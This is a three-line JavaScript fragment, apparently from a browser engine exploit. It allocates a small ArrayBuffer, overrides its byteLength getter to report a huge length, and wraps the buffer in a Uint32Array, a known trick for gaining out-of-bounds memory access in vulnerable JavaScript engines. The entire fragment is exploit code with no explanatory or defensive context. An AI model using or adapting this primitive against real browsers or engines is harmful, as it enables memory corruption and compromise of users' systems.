faulty_arr_buf = new ArrayBuffer(0x20);
faulty_arr_buf.__defineGetter__("byteLength", function() { return 0xFFFFFFFC; });
faulty_arr = new Uint32Array(faulty_arr_buf);
